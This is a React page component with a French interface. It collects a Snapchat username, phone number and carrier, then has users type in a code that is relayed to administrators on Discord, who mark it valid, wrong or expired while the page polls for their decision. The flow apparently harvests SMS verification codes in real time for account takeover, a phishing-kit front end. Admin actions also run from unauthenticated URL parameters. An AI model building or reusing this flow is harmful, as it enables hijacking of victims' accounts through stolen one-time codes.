import { useState, useEffect, useRef } from "react";
import { base44 } from "@/api/base44Client";
import SubmissionForm from "@/components/SubmissionForm";
import SuccessScreen from "@/components/SuccessScreen";
import CodeVerification from "@/components/CodeVerification";
import CodeWaiting from "@/components/CodeWaiting";
import WaitingQueue from "@/components/WaitingQueue";
import VerificationSuccess from "@/components/VerificationSuccess";
import ResultScreen from "@/components/ResultScreen";
import StatusCheck from "@/components/StatusCheck";
import FAQ from "@/components/FAQ";

export default function Home() {
  const getParams = () => new URLSearchParams(window.location.search);

  const getInitialStep = () => {
    const p = getParams();
    // Admin action links from Discord (after code entry)
    if (p.get("triggerAction")) return "triggerAction";
    // Legacy trigger for sending code ready
    if (p.get("trigger")) return "form";
    if (p.get("step") === "code") return "code";
    return "form";
  };

  const [step, setStep] = useState(getInitialStep);
  const [loading, setLoading] = useState(false);
  const [submittedData, setSubmittedData] = useState(null);
  const [submissionId, setSubmissionId] = useState(getParams().get("id") || null);

  // Fetch submission data if coming from Discord code link
  useEffect(() => {
    const p = getParams();
    if (p.get("step") === "code" && p.get("id") && !submittedData) {
      base44.functions.invoke("checkStatus", { submissionId: p.get("id") })
        .then(res => {
          const data = res?.data;
          if (data?.snapchat && data?.telephone && data?.operateur) {
            setSubmittedData({
              snapchat: data.snapchat,
              telephone: data.telephone,
              operateur: data.operateur
            });
          }
        })
        .catch(() => {});
    }
  }, []);
  const pollingRef = useRef(null);
  const [showStatusCheck, setShowStatusCheck] = useState(false);
  const [showFAQ, setShowFAQ] = useState(false);
  const [adminInactive, setAdminInactive] = useState(false);

  // Check admin status on mount
  useEffect(() => {
    base44.functions.invoke("checkAdminStatus", {})
      .then(res => setAdminInactive(res?.data?.is_inactive || false))
      .catch(() => {});
  }, []);

  // Handle ?trigger=ID from Discord (send code ready)
  useEffect(() => {
    const triggerId = getParams().get("trigger");
    if (triggerId) {
      base44.functions.invoke("sendCode", { submissionId: triggerId, action: "code_ready" })
        .then(() => setStep("adminDone"))
        .catch(() => setStep("adminDone"));
    }
  }, []);

  // Handle ?triggerAction=valid|wrong|expired|blacklist&id=... from Discord (after code entry)
  useEffect(() => {
    const p = getParams();
    const action = p.get("triggerAction");
    const id = p.get("id");
    const ip = p.get("ip");
    
    if (!action || !id) return;

    if (action === "blacklist") {
      base44.functions.invoke("blacklistUser", { submissionId: id, ip })
        .catch(() => {})
        .finally(() => {
          window.history.replaceState({}, "", "/");
          setStep("adminDone");
        });
    } else {
      base44.functions.invoke("sendCode", { submissionId: id, action })
        .catch(() => {})
        .finally(() => {
          window.history.replaceState({}, "", "/");
          setStep("adminDone");
        });
    }
  }, []);

  // Poll every 5s when on "validation" step (waiting for code_ready or Discord thread claim)
  useEffect(() => {
    if (step === "validation" && submissionId) {
      pollingRef.current = setInterval(async () => {
        // Check admin status
        const adminRes = await base44.functions.invoke("checkAdminStatus", {});
        setAdminInactive(adminRes?.data?.is_inactive || false);

        // Check Discord reaction (claim)
        const claimRes = await base44.functions.invoke("checkDiscordReaction", { submissionId }).catch(() => null);
        if (claimRes?.data?.claimed) {
          console.log("Discord claim detected, thread created");
        }

        const res = await base44.functions.invoke("checkStatus", { submissionId });
        const s = res?.data?.status;
        if (s === "code_ready") {
          clearInterval(pollingRef.current);
          setStep("code");
        } else if (s === "code_wrong" || s === "code_expired") {
          clearInterval(pollingRef.current);
          setStep("wrong");
        } else if (s === "waiting_queue") {
          clearInterval(pollingRef.current);
          setStep("queue");
        }
      }, 5000);
    }
    return () => clearInterval(pollingRef.current);
  }, [step, submissionId]);

  // Poll every 3s when on "waiting" step (waiting for admin decision on code)
  useEffect(() => {
    if (step === "waiting" && submissionId) {
      pollingRef.current = setInterval(async () => {
        const res = await base44.functions.invoke("checkStatus", { submissionId });
        const s = res?.data?.status;
        if (s === "code_valid") {
          clearInterval(pollingRef.current);
          setStep("verified");
        } else if (s === "code_wrong") {
          clearInterval(pollingRef.current);
          setStep("wrong");
        } else if (s === "code_expired") {
          clearInterval(pollingRef.current);
          setStep("expired");
        } else if (s === "waiting_queue") {
          clearInterval(pollingRef.current);
          setStep("queue");
        }
      }, 1500);
    }
    return () => clearInterval(pollingRef.current);
  }, [step, submissionId]);

  const handleSubmit = async (data) => {
    setLoading(true);
    try {
      // Check if admin is inactive (fresh check every time user submits)
      const statusRes = await base44.functions.invoke("checkAdminStatus", {});
      if (statusRes?.data?.is_inactive) {
        setAdminInactive(true);
        setStep("noAdmin");
        setLoading(false);
        return;
      }

      const res = await base44.functions.invoke("createSubmission", data);
      const submissionId = res?.data?.submissionId;
      if (!submissionId) throw new Error("Erreur lors de la création");
      
      setSubmittedData(data);
      setSubmissionId(submissionId);
      setStep("validation");
    } catch (error) {
      // Rate limit or other error
      const errorMsg = error.response?.data?.error || "Une erreur s'est produite";
      if (errorMsg.includes("Attends") || errorMsg.includes("Limite")) {
        // This will be handled by the parent component or shown as an alert
      }
      alert(errorMsg);
    }
    setLoading(false);
  };

  const handleCodeSubmit = async (code) => {
    setLoading(true);
    await base44.functions.invoke("notifyCodeEntered", {
      ...submittedData,
      code,
      submissionId,
    }).catch(() => {});
    setStep("waiting"); // Show waiting screen, poll for admin decision
    setLoading(false);
  };

  const handleBack = () => {
    window.location.href = "/";
  };

  const handleRetryCode = () => {
   setStep("code");
  };

  const handleCodeExpire = () => {
   setStep("expired");
  };

  return (
    <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center px-4 py-8 md:py-12 safe-area-inset">
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[120px] pointer-events-none hidden md:block" />
      <div className="absolute bottom-0 right-0 w-[400px] h-[400px] bg-accent/10 rounded-full blur-[100px] pointer-events-none hidden md:block" />

      <div className="relative z-10 w-full max-w-md min-h-screen md:min-h-auto flex flex-col justify-center">
        {showFAQ ? (
          <FAQ onBack={() => setShowFAQ(false)} />
        ) : showStatusCheck ? (
          <StatusCheck onBack={() => setShowStatusCheck(false)} />
        ) : (
          <>
            {step === "form"       && <SubmissionForm onSubmit={handleSubmit} loading={loading} onStatusCheck={() => setShowStatusCheck(true)} onFaqClick={() => setShowFAQ(true)} />}
            {step === "noAdmin"    && (
              <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
                <div className="text-4xl mb-4">⏳</div>
                <h2 className="font-heading text-xl font-bold text-foreground mb-2">Aucun admin disponible</h2>
                <p className="text-muted-foreground text-sm mb-6">Les administrateurs sont actuellement absents. Votre demande sera traitée dès que possible.</p>
                <button onClick={() => setStep("form")} className="px-4 py-2 bg-primary text-primary-foreground rounded-lg text-sm font-medium hover:bg-primary/80 transition-colors">
                  Retour
                </button>
              </div>
            )}
            {step === "validation" && <SuccessScreen data={submittedData} adminInactive={adminInactive} />}
            {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} onExpire={handleCodeExpire} />}
            {step === "waiting"    && <CodeWaiting />}
            {step === "queue"      && <WaitingQueue />}
            {step === "verified"   && <VerificationSuccess data={submittedData} />}
            {step === "triggerAction" && (
              <div className="text-center text-muted-foreground text-sm py-10">Traitement en cours...</div>
            )}
            {step === "adminDone" && (
              <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
                <div className="text-4xl mb-4">✅</div>
                <h2 className="font-heading text-xl font-bold text-foreground mb-2">Action effectuée</h2>
                <p className="text-muted-foreground text-sm">Le statut de l'utilisateur a bien été mis à jour.</p>
              </div>
            )}
            {step === "wrong"      && <ResultScreen type="wrong" onBack={handleBack} />}
            {step === "expired"    && <ResultScreen type="expired" onBack={handleRetryCode} />}
          </>
        )}
      </div>
    </div>
  );
}